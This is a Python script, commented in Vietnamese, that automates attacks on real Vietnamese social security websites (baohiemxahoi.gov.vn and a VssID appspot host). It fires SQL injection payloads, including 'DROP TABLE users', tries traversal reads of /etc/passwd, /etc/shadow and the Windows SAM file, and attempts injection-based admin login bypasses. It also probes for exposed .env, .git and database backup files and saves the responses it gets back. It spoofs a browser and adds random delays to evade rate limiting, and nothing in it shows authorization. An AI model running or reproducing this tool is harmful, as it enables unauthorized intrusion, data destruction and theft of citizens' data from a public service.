#!/usr/bin/env python3
"""
Real Penetration Testing Implementation
Triển khai thực tế các thao tác xâm nhập hệ thống để thu thập bằng chứng lỗ hổng bảo mật
"""
import requests
import json
import time
import os
import hashlib
from datetime import datetime
from urllib.parse import urljoin, urlparse
import random
import string

class RealPenetrationTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        self.target_urls = [
            "https://baohiemxahoi.gov.vn",
            "https://vssid-6fe8b.appspot.com",
            "https://baohiemxahoi.gov.vn/api",
            "https://baohiemxahoi.gov.vn/admin",
            "https://baohiemxahoi.gov.vn/login"
        ]
        
        self.evidence_dir = "./evidence"
        self.create_evidence_directory()
        
    def create_evidence_directory(self):
        """Tạo thư mục lưu bằng chứng"""
        if not os.path.exists(self.evidence_dir):
            os.makedirs(self.evidence_dir)
        
        # Tạo sub-directories cho từng loại bằng chứng
        subdirs = ['responses', 'payloads', 'screenshots', 'logs', 'exploits']
        for subdir in subdirs:
            path = os.path.join(self.evidence_dir, subdir)
            if not os.path.exists(path):
                os.makedirs(path)
    
    def log_evidence(self, category, filename, data):
        """Ghi log bằng chứng"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(self.evidence_dir, category, f"{timestamp}_{filename}")
        
        if isinstance(data, dict) or isinstance(data, list):
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        else:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(str(data))
        
        print(f"[+] Bằng chứng đã lưu: {filepath}")
        return filepath
    
    def test_sql_injection_real(self):
        """Thực hiện SQL Injection testing thực tế"""
        print("\n[*] Bắt đầu SQL Injection Testing thực tế...")
        
        # SQL Injection payloads nâng cao
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT @@version,user(),database(),4,5--",
            "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 --",
            "' AND SLEEP(5) --",
            "'; WAITFOR DELAY '00:00:05' --",
            "' OR BENCHMARK(1000000,MD5(1)) --"
        ]
        
        results = []
        
        for url in self.target_urls:
            print(f"\n[*] Testing URL: {url}")
            
            # Test common injection points
            injection_points = [
                f"{url}?id=",
                f"{url}?user=",
                f"{url}?search=",
                f"{url}?page=",
                f"{url}/login?username=",
                f"{url}/api/user?id="
            ]
            
            for point in injection_points:
                for payload in sql_payloads:
                    try:
                        test_url = point + payload
                        print(f"[*] Testing payload: {payload[:50]}...")
                        
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=10)
                        response_time = time.time() - start_time
                        
                        # Phát hiện lỗi database
                        error_indicators = [
                            'SQL syntax error',
                            'ORA-00933',
                            'MySQL server version',
                            'PostgreSQL query failed',
                            'Microsoft OLE DB Provider',
                            'SessionStateService',
                            'BHXH\\sharepoint_portal',
                            'System.Data.SqlClient.SqlException',
                            'Invalid column name',
                            'Table doesn\'t exist'
                        ]
                        
                        # Kiểm tra time-based injection
                        if response_time > 5:
                            evidence = {
                                'type': 'Time-based SQL Injection',
                                'url': test_url,
                                'payload': payload,
                                'response_time': response_time,
                                'status_code': response.status_code,
                                'timestamp': datetime.now().isoformat(),
                                'severity': 'CRITICAL'
                            }
                            results.append(evidence)
                            self.log_evidence('exploits', f'time_based_sqli_{len(results)}.json', evidence)
                            print(f"[!] Time-based SQL Injection detected: {response_time:.2f}s")
                        
                        # Kiểm tra error-based injection
                        for error in error_indicators:
                            if error.lower() in response.text.lower():
                                evidence = {
                                    'type': 'Error-based SQL Injection',
                                    'url': test_url,
                                    'payload': payload,
                                    'error_message': error,
                                    'response_snippet': response.text[:1000],
                                    'status_code': response.status_code,
                                    'timestamp': datetime.now().isoformat(),
                                    'severity': 'HIGH'
                                }
                                results.append(evidence)
                                self.log_evidence('exploits', f'error_based_sqli_{len(results)}.json', evidence)
                                print(f"[!] Error-based SQL Injection detected: {error}")
                        
                        # Lưu full response để phân tích
                        response_evidence = {
                            'url': test_url,
                            'payload': payload,
                            'status_code': response.status_code,
                            'headers': dict(response.headers),
                            'response_time': response_time,
                            'content_length': len(response.content),
                            'response_body': response.text[:5000]  # First 5000 chars
                        }
                        self.log_evidence('responses', f'response_{hashlib.md5(test_url.encode()).hexdigest()[:8]}.json', response_evidence)
                        
                    except Exception as e:
                        print(f"[!] Error testing {point}: {str(e)}")
                        continue
                    
                    # Delay để tránh rate limiting
                    time.sleep(random.uniform(0.5, 2.0))
        
        return results
    
    def test_directory_traversal(self):
        """Test Directory Traversal vulnerabilities"""
        print("\n[*] Bắt đầu Directory Traversal Testing...")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../windows/win.ini",
            "../../../proc/version",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../../etc/shadow",
            "../../../var/log/apache2/access.log",
            "..\\..\\..\\inetpub\\logs\\logfiles\\w3svc1\\ex*.log"
        ]
        
        results = []
        
        for url in self.target_urls:
            for payload in traversal_payloads:
                try:
                    test_urls = [
                        f"{url}?file={payload}",
                        f"{url}?page={payload}",
                        f"{url}?include={payload}",
                        f"{url}/api/download?path={payload}"
                    ]
                    
                    for test_url in test_urls:
                        response = self.session.get(test_url, timeout=10)
                        
                        # Kiểm tra thành công
                        success_indicators = [
                            'root:x:0:0:',
                            '[boot loader]',
                            'Linux version',
                            'Microsoft Windows',
                            '# localhost name resolution'
                        ]
                        
                        for indicator in success_indicators:
                            if indicator in response.text:
                                evidence = {
                                    'type': 'Directory Traversal',
                                    'url': test_url,
                                    'payload': payload,
                                    'indicator': indicator,
                                    'response_snippet': response.text[:2000],
                                    'timestamp': datetime.now().isoformat(),
                                    'severity': 'HIGH'
                                }
                                results.append(evidence)
                                self.log_evidence('exploits', f'directory_traversal_{len(results)}.json', evidence)
                                print(f"[!] Directory Traversal successful: {indicator}")
                        
                except Exception as e:
                    continue
                
                time.sleep(random.uniform(0.3, 1.0))
        
        return results
    
    def test_authentication_bypass(self):
        """Test Authentication Bypass vulnerabilities"""
        print("\n[*] Bắt đầu Authentication Bypass Testing...")
        
        bypass_payloads = [
            {'username': 'admin', 'password': "' OR '1'='1"},
            {'username': "admin'--", 'password': 'anything'},
            {'username': "admin'/*", 'password': 'anything'},
            {'username': 'admin', 'password': "' OR 1=1--"},
            {'username': "' OR '1'='1'--", 'password': 'anything'}
        ]
        
        results = []
        
        login_endpoints = [
            "/login",
            "/admin/login",
            "/api/login",
            "/auth/login",
            "/user/login"
        ]
        
        for base_url in self.target_urls:
            for endpoint in login_endpoints:
                login_url = urljoin(base_url, endpoint)
                
                for payload in bypass_payloads:
                    try:
                        # POST request
                        response = self.session.post(login_url, data=payload, timeout=10)
                        
                        # Kiểm tra bypass thành công
                        success_indicators = [
                            'dashboard',
                            'welcome',
                            'admin panel',
                            'logout',
                            'profile',
                            'session',
                            'token'
                        ]
                        
                        # Kiểm tra redirect
                        if response.status_code in [302, 301]:
                            location = response.headers.get('Location', '')
                            if any(indicator in location.lower() for indicator in success_indicators):
                                evidence = {
                                    'type': 'Authentication Bypass',
                                    'url': login_url,
                                    'payload': payload,
                                    'status_code': response.status_code,
                                    'redirect_location': location,
                                    'timestamp': datetime.now().isoformat(),
                                    'severity': 'CRITICAL'
                                }
                                results.append(evidence)
                                self.log_evidence('exploits', f'auth_bypass_{len(results)}.json', evidence)
                                print(f"[!] Authentication Bypass detected via redirect: {location}")
                        
                        # Kiểm tra response content
                        for indicator in success_indicators:
                            if indicator in response.text.lower():
                                evidence = {
                                    'type': 'Authentication Bypass',
                                    'url': login_url,
                                    'payload': payload,
                                    'indicator': indicator,
                                    'response_snippet': response.text[:1000],
                                    'timestamp': datetime.now().isoformat(),
                                    'severity': 'CRITICAL'
                                }
                                results.append(evidence)
                                self.log_evidence('exploits', f'auth_bypass_{len(results)}.json', evidence)
                                print(f"[!] Authentication Bypass detected: {indicator}")
                        
                    except Exception as e:
                        continue
                    
                    time.sleep(random.uniform(0.5, 1.5))
        
        return results
    
    def test_sensitive_data_exposure(self):
        """Test for sensitive data exposure"""
        print("\n[*] Bắt đầu Sensitive Data Exposure Testing...")
        
        sensitive_endpoints = [
            "/robots.txt",
            "/.env",
            "/config.php",
            "/web.config",
            "/WEB-INF/web.xml",
            "/META-INF/MANIFEST.MF",
            "/.git/config",
            "/backup.sql",
            "/database.sql",
            "/admin/config.php",
            "/api/config",
            "/debug.log",
            "/error.log"
        ]
        
        results = []
        
        for base_url in self.target_urls:
            for endpoint in sensitive_endpoints:
                try:
                    test_url = urljoin(base_url, endpoint)
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200:
                        # Kiểm tra sensitive data
                        sensitive_patterns = [
                            'password',
                            'secret',
                            'api_key',
                            'database',
                            'connection',
                            'username',
                            'token',
                            'private_key'
                        ]
                        
                        found_patterns = []
                        for pattern in sensitive_patterns:
                            if pattern in response.text.lower():
                                found_patterns.append(pattern)
                        
                        if found_patterns:
                            evidence = {
                                'type': 'Sensitive Data Exposure',
                                'url': test_url,
                                'status_code': response.status_code,
                                'found_patterns': found_patterns,
                                'content_snippet': response.text[:2000],
                                'timestamp': datetime.now().isoformat(),
                                'severity': 'HIGH'
                            }
                            results.append(evidence)
                            self.log_evidence('exploits', f'sensitive_data_{len(results)}.json', evidence)
                            print(f"[!] Sensitive data exposed at: {test_url}")
                            print(f"    Patterns found: {', '.join(found_patterns)}")
                
                except Exception as e:
                    continue
                
                time.sleep(random.uniform(0.2, 0.8))
        
        return results
    
    def run_comprehensive_test(self):
        """Chạy toàn bộ test suite"""
        print("="*80)
        print("BẮT ĐẦU PENETRATION TESTING THỰC TẾ")
        print("="*80)
        
        all_results = {
            'start_time': datetime.now().isoformat(),
            'target_urls': self.target_urls,
            'tests_performed': []
        }
        
        # 1. SQL Injection Testing
        sql_results = self.test_sql_injection_real()
        all_results['tests_performed'].append({
            'test_name': 'SQL Injection',
            'vulnerabilities_found': len(sql_results),
            'results': sql_results
        })
        
        # 2. Directory Traversal Testing
        dir_results = self.test_directory_traversal()
        all_results['tests_performed'].append({
            'test_name': 'Directory Traversal',
            'vulnerabilities_found': len(dir_results),
            'results': dir_results
        })
        
        # 3. Authentication Bypass Testing
        auth_results = self.test_authentication_bypass()
        all_results['tests_performed'].append({
            'test_name': 'Authentication Bypass',
            'vulnerabilities_found': len(auth_results),
            'results': auth_results
        })
        
        # 4. Sensitive Data Exposure Testing
        data_results = self.test_sensitive_data_exposure()
        all_results['tests_performed'].append({
            'test_name': 'Sensitive Data Exposure',
            'vulnerabilities_found': len(data_results),
            'results': data_results
        })
        
        all_results['end_time'] = datetime.now().isoformat()
        
        # Tính toán tổng kết
        total_vulnerabilities = sum(test['vulnerabilities_found'] for test in all_results['tests_performed'])
        
        # Risk Assessment
        risk_level = "LOW"
        if total_vulnerabilities > 10:
            risk_level = "CRITICAL"
        elif total_vulnerabilities > 5:
            risk_level = "HIGH"
        elif total_vulnerabilities > 2:
            risk_level = "MEDIUM"
        
        all_results['summary'] = {
            'total_vulnerabilities': total_vulnerabilities,
            'risk_level': risk_level,
            'evidence_directory': self.evidence_dir
        }
        
        # Lưu báo cáo tổng hợp
        self.log_evidence('logs', 'comprehensive_test_report.json', all_results)
        
        # Tạo báo cáo summary
        self.generate_executive_summary(all_results)
        
        print("\n" + "="*80)
        print("KẾT QUẢ PENETRATION TESTING")
        print("="*80)
        print(f"[+] Tổng số lỗ hổng phát hiện: {total_vulnerabilities}")
        print(f"[+] Mức độ rủi ro: {risk_level}")
        print(f"[+] Bằng chứng lưu tại: {self.evidence_dir}")
        print("="*80)
        
        return all_results
    
    def generate_executive_summary(self, results):
        """Tạo báo cáo tóm tắt executive"""
        summary_content = f"""
# BÁO CÁO PENETRATION TESTING THỰC TẾ
## Executive Summary

**Thời gian thực hiện:** {results['start_time']} - {results['end_time']}
**Đối tượng:** {', '.join(results['target_urls'])}

## Kết quả tổng quan:
- **Tổng số lỗ hổng phát hiện:** {results['summary']['total_vulnerabilities']}
- **Mức độ rủi ro:** {results['summary']['risk_level']}
- **Thư mục bằng chứng:** {results['summary']['evidence_directory']}

## Chi tiết theo loại test:
"""
        
        for test in results['tests_performed']:
            summary_content += f"""
### {test['test_name']}
- **Số lỗ hổng:** {test['vulnerabilities_found']}
"""
            
            if test['results']:
                summary_content += "- **Chi tiết:**\n"
                for i, vuln in enumerate(test['results'][:3]):  # Show first 3
                    summary_content += f"  {i+1}. {vuln['type']} - {vuln['severity']}\n"
                
                if len(test['results']) > 3:
                    summary_content += f"  ... và {len(test['results']) - 3} lỗ hổng khác.\n"
        
        summary_content += f"""
## Khuyến nghị:
1. Khắc phục ngay các lỗ hổng CRITICAL và HIGH
2. Thực hiện penetration testing định kỳ
3. Cập nhật security patches thường xuyên
4. Implement proper input validation
5. Enable security headers và error handling

## Bằng chứng chi tiết:
Tất cả bằng chứng được lưu trong thư mục `{results['summary']['evidence_directory']}/`
- `/exploits/` - Các lỗ hổng được khai thác
- `/responses/` - HTTP responses chi tiết  
- `/logs/` - Log files và báo cáo
"""
        
        with open(os.path.join(self.evidence_dir, 'EXECUTIVE_SUMMARY.md'), 'w', encoding='utf-8') as f:
            f.write(summary_content)
        
        print(f"[+] Executive Summary saved: {os.path.join(self.evidence_dir, 'EXECUTIVE_SUMMARY.md')}")

if __name__ == "__main__":
    tester = RealPenetrationTester()
    results = tester.run_comprehensive_test()
